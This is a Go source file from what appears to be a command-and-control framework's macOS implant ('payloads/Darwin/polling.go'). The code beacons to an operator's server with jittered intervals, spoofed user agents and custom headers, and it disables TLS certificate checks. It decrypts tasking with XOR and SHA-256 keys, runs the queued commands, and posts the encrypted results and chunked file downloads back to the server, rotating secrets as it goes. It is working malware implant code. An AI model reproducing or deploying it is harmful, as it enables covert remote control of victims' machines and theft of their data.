// server/docker/payloads/Darwin/polling.go

//go:build darwin
// +build darwin

package main

import (
	"bytes"
	"crypto/sha256"
	"crypto/tls"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"io"
	"math"
	"math/rand"
	"net/http"
	"strconv"
	"strings"
	"sync"
	"time"
)

// PollConfig holds the configuration for polling behavior
type PollConfig struct {
	GetURL          string
	PostURL         string
	DecryptedValues map[string]string
}

var (
	commandQueue    *CommandQueue
	resultManager   *ResultManager
	currentPolling  *sync.WaitGroup
	pollingShutdown chan struct{}
	pollingMutex    sync.Mutex
)

func init() {
	commandQueue = NewCommandQueue()
	resultManager = NewResultManager()
	currentPolling = &sync.WaitGroup{}
	pollingShutdown = make(chan struct{})
}

// deriveXORKey creates the same XOR key as the server
func deriveXORKey(clientID, secret string) []byte {
	// Must match server implementation exactly
	combined := clientID + ":" + secret
	hash := sha256.Sum256([]byte(combined))
	return hash[:32]
}

// xorDecryptBytes decrypts byte array using XOR
func xorDecryptBytes(data []byte, key []byte) []byte {
	result := make([]byte, len(data))
	for i := 0; i < len(data); i++ {
		result[i] = data[i] ^ key[i%len(key)]
	}
	return result
}

// tryDecryptResponse attempts to find and decrypt the XOR encrypted field
func tryDecryptResponse(rawResponse map[string]interface{}, xorKey []byte) (map[string]interface{}, error) {
	// Try each field in the response
	for fieldName, fieldValue := range rawResponse {
		// Skip non-string fields
		strValue, ok := fieldValue.(string)
		if !ok {
			continue
		}

		// Try to base64 decode
		encrypted, err := base64.StdEncoding.DecodeString(strValue)
		if err != nil {
			continue // Not valid base64, skip
		}

		// Try to XOR decrypt
		decrypted := xorDecryptBytes(encrypted, xorKey)

		// Try to parse as JSON
		var response map[string]interface{}
		if err := json.Unmarshal(decrypted, &response); err != nil {
			continue // Not valid JSON after decryption, skip
		}

		// Check if it has expected fields (status is required)
		if _, hasStatus := response["status"]; hasStatus {
			fmt.Printf("[DEBUG] Successfully decrypted response from field '%s'\n", fieldName)
			return response, nil
		}
	}

	return nil, fmt.Errorf("no valid encrypted response found")
}

// checkAsyncBOFResults checks for pending async BOF results (Windows only)
// This function is only compiled and called on Windows where bofJobManager exists

// calculateJitteredInterval applies jitter to the base sleep interval
func calculateJitteredInterval(baseSeconds int, jitterPercent float64, r *rand.Rand) time.Duration {
	baseInterval := time.Duration(baseSeconds) * time.Second
	jitterFactor := jitterPercent / 100.0
	maxVariation := float64(baseInterval) * jitterFactor
	variation := (r.Float64()*2 - 1) * maxVariation
	jitteredInterval := time.Duration(float64(baseInterval) + variation)
	return jitteredInterval
}

// sendResults sends encrypted results to the server
func sendResults(encryptedData string, customHeaders map[string]string) error {
	// Get current URLs dynamically
	_, postURL := handshakeManager.GetCurrentURLs()
	decryptedValues := handshakeManager.decryptedValues

	postData := struct {
		Data string `json:"data"`
	}{
		Data: encryptedData,
	}

	jsonData, err := json.Marshal(postData)
	if err != nil {
		return fmt.Errorf("failed to marshal post data: %v", err)
	}

	// Get the custom POST method from decrypted values
	method := decryptedValues["POST Method"]
	if method == "" {
		method = "POST" // Fallback to default
	}

	// Print the request details for debugging
	fmt.Printf("\n%s Request Details:\n", method)
	fmt.Printf("URL: %s\n", postURL)
	fmt.Printf("Method: %s\n", method)
	fmt.Printf("Headers:\n")
	fmt.Printf("  Content-Type: application/json\n")
	fmt.Printf("  User-Agent: %s\n", decryptedValues["User Agent"])
	for key, value := range customHeaders {
		fmt.Printf("  %s: %s\n", key, value)
	}
	fmt.Printf("Body: %s\n\n", string(jsonData))

	// Create request with custom method
	req, err := http.NewRequest(method, postURL, bytes.NewBuffer(jsonData))
	if err != nil {
		return fmt.Errorf("failed to create %s request: %v", method, err)
	}

	req.Header.Set("Content-Type", "application/json")
	req.Header.Set("User-Agent", decryptedValues["User Agent"])
	for key, value := range customHeaders {
		req.Header.Set(key, value)
	}

	client := &http.Client{
		Transport: &http.Transport{
			TLSClientConfig: &tls.Config{
				InsecureSkipVerify: true,
			},
		},
		Timeout: time.Second * 30,
	}

	resp, err := client.Do(req)
	if err != nil {
		return fmt.Errorf("failed to send %s request: %v", method, err)
	}
	defer func() {
		io.Copy(io.Discard, resp.Body) // drain body
		resp.Body.Close()              // then close
	}()

	if resp.StatusCode != http.StatusOK {
		return fmt.Errorf("server returned non-200 status code: %d", resp.StatusCode)
	}

	return nil
}

// doPoll performs a single poll cycle
func doPoll(secureComms *SecureComms, customHeaders map[string]string) error {
	// Get current URLs dynamically
	getURL, _ := handshakeManager.GetCurrentURLs()
	decryptedValues := handshakeManager.decryptedValues

	// Get the custom GET method from decrypted values
	method := decryptedValues["GET Method"]
	if method == "" {
		method = "GET" // Fallback to default
	}

	// Create the request with custom method
	req, err := http.NewRequest(method, getURL, nil)
	if err != nil {
		return fmt.Errorf("failed to create %s request: %v", method, err)
	}

	// Set headers
	req.Header.Set("User-Agent", decryptedValues["User Agent"])
	for key, value := range customHeaders {
		req.Header.Set(key, value)
	}

	// Create HTTP client with TLS config
	client := &http.Client{
		Transport: &http.Transport{
			TLSClientConfig: &tls.Config{
				InsecureSkipVerify: true,
			},
		},
		Timeout: time.Second * 30,
	}

	// Send request
	resp, err := client.Do(req)
	if err != nil {
		return fmt.Errorf("failed to send %s request: %v", method, err)
	}
	defer func() {
		io.Copy(io.Discard, resp.Body)
		resp.Body.Close()
	}()

	// Read response body
	body, err := io.ReadAll(resp.Body)
	if err != nil {
		return fmt.Errorf("failed to read response: %v", err)
	}

	// First try to parse as raw JSON
	var rawResponse map[string]interface{}
	if err := json.Unmarshal(body, &rawResponse); err != nil {
		return fmt.Errorf("failed to parse response: %v", err)
	}

	// Determine if response is encrypted or not
	var response struct {
		Status      string      `json:"status"`
		Data        string      `json:"data"`
		CommandDBID interface{} `json:"command_db_id"`
	}

	// Check if this is an XOR encrypted response
	if _, hasStatus := rawResponse["status"]; !hasStatus && len(rawResponse) > 0 {
		// Likely encrypted, try to decrypt
		fmt.Printf("[DEBUG] Response appears encrypted, attempting XOR decryption\n")

		// Get current secret from secureComms
		currentSecret := secureComms.secret1 // Direct access to field
		xorKey := deriveXORKey(clientID, currentSecret)

		decryptedMap, err := tryDecryptResponse(rawResponse, xorKey)
		if err != nil {
			// Couldn't decrypt, maybe it's a legacy response
			fmt.Printf("[DEBUG] XOR decryption failed: %v, treating as legacy\n", err)
			// Try to marshal raw response back into our struct
			jsonBytes, _ := json.Marshal(rawResponse)
			json.Unmarshal(jsonBytes, &response)
		} else {
			// Successfully decrypted
			if statusVal, ok := decryptedMap["status"].(string); ok {
				response.Status = statusVal
			}
			if dataVal, ok := decryptedMap["data"].(string); ok {
				response.Data = dataVal
			}
			if cmdIDVal, ok := decryptedMap["command_db_id"]; ok {
				response.CommandDBID = cmdIDVal
			}
		}
	} else {
		// Legacy unencrypted response
		fmt.Printf("[DEBUG] Using legacy unencrypted response format\n")
		jsonBytes, _ := json.Marshal(rawResponse)
		json.Unmarshal(jsonBytes, &response)
	}

	fmt.Printf("[DEBUG] Received response - Status: %s, Has Data: %v\n",
		response.Status, response.Data != "")

	// Check for rekey command (special status that doesn't require decryption)
	if response.Status == "rekey_required" {
		fmt.Println("[DEBUG] Received rekey command from server")

		// Extract command DB ID for the rekey result
		var commandDBID int
		switch v := response.CommandDBID.(type) {
		case float64:
			commandDBID = int(v)
		case int:
			commandDBID = v
		case string:
			commandDBID, _ = strconv.Atoi(v)
		}

		// Execute rekey command directly without decryption
		fmt.Println("[DEBUG] Executing rekey command...")

		// Create result for the rekey command first (before triggering rekey)
		rekeyResult := &CommandResult{
			Command: Command{
				Command:     "rekey",
				CommandDBID: commandDBID,
				AgentID:     clientID,
			},
			CompletedAt: time.Now().Format(time.RFC3339),
			Output:      "Rekey initiated",
			ExitCode:    0,
		}

		// Queue the result to be sent back
		if err := resultManager.AddResult(rekeyResult); err != nil {
			fmt.Printf("[DEBUG] Error queueing rekey result: %v\n", err)
		} else {
			fmt.Printf("[DEBUG] Successfully queued rekey result for processing\n")
		}

		// Perform handshake refresh in a separate goroutine to avoid deadlock
		go func() {
			fmt.Println("[DEBUG] Starting rekey in background...")
			if err := refreshHandshake(); err != nil {
				fmt.Printf("[DEBUG] Rekey failed: %v\n", err)
			} else {
				fmt.Println("[DEBUG] Rekey completed successfully")
			}
		}()

		// Return immediately - the new goroutine will handle the rekey
		// This allows the current polling goroutine to exit cleanly
		return fmt.Errorf("rekey in progress")
	}

	// Check for no commands
	if response.Status == "no_commands" {
		return nil
	}

	// Normal encrypted command processing
	if response.Data != "" {
		decrypted, err := secureComms.DecryptMessage(response.Data)
		if err != nil {
			// Log decryption failure which might indicate key desync
			fmt.Printf("[DEBUG] Decryption failed: %v\n", err)
			fmt.Println("[DEBUG] Key desync detected - initiating automatic rekey")

			// Automatically trigger rekey in background
			go func() {
				fmt.Println("[DEBUG] Starting automatic rekey due to decryption failure...")
				if rekeyErr := refreshHandshake(); rekeyErr != nil {
					fmt.Printf("[DEBUG] Automatic rekey failed: %v\n", rekeyErr)
				} else {
					fmt.Println("[DEBUG] Automatic rekey completed successfully")
				}
			}()

			// Return nil instead of error to prevent cascading failures
			// The rekey will restart polling with fresh keys
			return nil
		}

		//fmt.Printf("[DEBUG] Decrypted command data from server: %s\n", decrypted)

		if err := commandQueue.AddCommands(decrypted); err != nil {
			return fmt.Errorf("failed to queue commands: %v", err)
		}

		// Process commands
		fmt.Println("[DEBUG] Starting to process commands...")
		for {
			result, err := commandQueue.ProcessNextCommand()
			if err != nil {
				fmt.Printf("[DEBUG] Error processing command: %v\n", err)
				continue
			}
			if result == nil {
				fmt.Println("[DEBUG] No more commands to process")
				break
			}
			/*
				fmt.Printf("[DEBUG] Processing command result:\n"+
					"Command: %s\n"+
					"Command DB ID: %d\n"+
					"Agent ID: %s\n"+
					"Filename: %s\n"+
					"Current Chunk: %d\n"+
					"Total Chunks: %d\n"+
					"Output: %s\n"+
					"Error: %v\n"+
					"Exit Code: %d\n",
					result.Command.Command,
					result.Command.CommandDBID,
					result.Command.AgentID,
					result.Command.Filename,
					result.Command.CurrentChunk,
					result.Command.TotalChunks,
					result.Output,
					result.Error,
					result.ExitCode)
			*/
			if err := resultManager.AddResult(result); err != nil {
				fmt.Printf("[DEBUG] Error queueing result: %v\n", err)
			} else {
				fmt.Printf("[DEBUG] Successfully queued result for processing\n")
			}
		}
		fmt.Println("[DEBUG] Command processing complete, rotating secret")
		secureComms.RotateSecret()
	}

	return nil
}

// startPolling initializes and starts the polling routine
func startPolling(config PollConfig, sysInfo *SystemInfoReport) error {
	// Use the SecureComms from HandshakeManager instead of creating a new one
	secureComms := handshakeManager.GetSecureComms()
	if secureComms == nil {
		// Fallback to creating new one if not available (shouldn't happen)
		secureComms = NewSecureComms(
			handshakeManager.decryptedValues["Secret"],
			sysInfo.AgentInfo.Seed,
		)
	}

	// Create a fresh shutdown channel for this polling session
	pollingMutex.Lock()
	pollingShutdown = make(chan struct{}) // Fresh channel for this session
	pollingMutex.Unlock()

	r := rand.New(rand.NewSource(time.Now().UnixNano()))

	// Parse custom headers from handshakeManager
	customHeaders, err := parseCustomHeaders(handshakeManager.decryptedValues["Custom Headers"])
	if err != nil {
		return fmt.Errorf("failed to parse custom headers: %v", err)
	}

	// Add to WaitGroup before starting goroutine
	currentPolling.Add(1)

	go func() {
		// Ensure we call Done when goroutine exits
		defer currentPolling.Done()

		consecutiveErrors := 0
		maxBackoffMultiplier := 5

		// Add label for outer loop
	pollingLoop:
		for {
			// Check for shutdown signal at the start of each iteration
			select {
			case <-pollingShutdown:
				fmt.Println("Polling shutdown signal received, exiting polling loop")
				return
			default:
				// Continue with polling
			}

			// Get current sleep and jitter values at start of each iteration
			baseSeconds, err := strconv.Atoi(sleep)
			if err != nil {
				fmt.Printf("Invalid sleep value '%s', using default: %v\n", sleep, err)
				baseSeconds = 30 // Default to 30 seconds if invalid
			}

			// Get current jitter value
			jitterValue, err := strconv.ParseFloat(jitter, 64)
			if err != nil {
				fmt.Printf("Invalid jitter value '%s', using default: %v\n", jitter, err)
				jitterValue = 10.0 // Default to 10% if invalid
			}

			nextInterval := calculateJitteredInterval(baseSeconds, jitterValue, r)
			if consecutiveErrors > 0 {
				backoffMultiplier := math.Min(float64(consecutiveErrors), float64(maxBackoffMultiplier))
				backoffInterval := time.Duration(float64(nextInterval) * math.Pow(2, backoffMultiplier))
				fmt.Printf("Error backoff: Attempt %d, waiting %v before retry\n",
					consecutiveErrors, backoffInterval)
				nextInterval = backoffInterval
			} else {
				fmt.Printf("Next poll in %v (base sleep: %ds, jitter: %.1f%%)\n",
					nextInterval, baseSeconds, jitterValue)
			}

			// Handle pending results before sleep
			if resultManager.HasResults() {
				results := resultManager.GetPendingResults()
				if len(results) > 0 {
					// ADD DETAILED DEBUG LOGGING
					fmt.Printf("[DEBUG Polling] Preparing to send %d results:\n", len(results))
					for i, res := range results {
						fmt.Printf("  [%d] cmd=%s, filename=%s, chunk=%d/%d, data_len=%d\n",
							i, res.Command, res.Filename, res.CurrentChunk, res.TotalChunks, len(res.Data))
					}

					encryptedData := struct {
						AgentID string            `json:"agent_id"`
						Results []CommandResponse `json:"results"`
					}{
						AgentID: clientID,
						Results: results,
					}
					//fmt.Println("\n=== Outgoing Command Queue Before Encryption ===")
					jsonData, err := json.MarshalIndent(encryptedData, "", "    ")
					if err != nil {
						fmt.Printf("Error marshaling results: %v\n", err)
					} else {
						// ADD DEBUG TO SHOW JSON STRUCTURE
						preview := string(jsonData)
						if len(preview) > 500 {
							preview = preview[:500] + "..."
						}
						fmt.Printf("[DEBUG Polling] JSON being sent (first 500 chars):\n%s\n", preview)

						//fmt.Println(string(jsonData))
						encrypted, err := secureComms.EncryptMessage(string(jsonData))
						if err != nil {
							fmt.Printf("Error encrypting results: %v\n", err)
						} else {
							// Updated call - no config parameter
							if err := sendResults(encrypted, customHeaders); err != nil {
								fmt.Printf("Error sending results: %v\n", err)
							} else {
								// Only cleanup after confirmed send
								for _, result := range results {
									if result.CurrentChunk > 0 && result.CurrentChunk == result.TotalChunks {
										commandQueue.mu.Lock()
										if _, exists := commandQueue.activeDownloads[result.Filename]; exists {
											delete(commandQueue.activeDownloads, result.Filename)
											fmt.Printf("Download cleanup completed for %s after successful send\n", result.Filename)
										}
										commandQueue.mu.Unlock()
									}
								}
								secureComms.RotateSecret()
							}
						}
					}
				}
			}

			// Check for shutdown before sleep
			select {
			case <-pollingShutdown:
				fmt.Println("Polling shutdown requested before sleep, exiting...")
				return
			case <-time.After(nextInterval):
				// Continue with next poll
			}

			// Perform the poll AFTER sleep
			if err := doPoll(secureComms, customHeaders); err != nil {
				// Check if this is a rekey in progress - if so, exit the entire goroutine
				if err.Error() == "rekey in progress" {
					fmt.Println("Rekey initiated, exiting current polling loop")
					break pollingLoop // Break out of the outer for loop
				}
				// Check for decryption failures
				if strings.Contains(err.Error(), "failed to decrypt response") {
					fmt.Printf("[ERROR] Decryption failed, possible version mismatch: %v\n", err)
					// Could trigger automatic rekey here if needed
				}
				fmt.Printf("Poll error: %v\n", err)
				consecutiveErrors++
			} else {
				consecutiveErrors = 0
			}
		}
	}()

	return nil
}

// StopPolling signals the current polling routine to stop and waits for it to finish
func StopPolling() {
	fmt.Println("Stopping current polling routine...")

	pollingMutex.Lock()
	if pollingShutdown != nil {
		close(pollingShutdown)
		pollingShutdown = nil // Set to nil instead of creating new channel
	}
	pollingMutex.Unlock()

	// Wait with timeout to prevent hanging
	done := make(chan struct{})
	go func() {
		currentPolling.Wait()
		close(done)
	}()

	select {
	case <-done:
		fmt.Println("Polling routine stopped successfully")
	case <-time.After(10 * time.Second):
		fmt.Println("Warning: Polling routine stop timed out after 10 seconds")
	}

	// Reset only the WaitGroup, NOT the channel
	pollingMutex.Lock()
	currentPolling = &sync.WaitGroup{}
	// Don't recreate pollingShutdown here - leave it nil
	pollingMutex.Unlock()
}
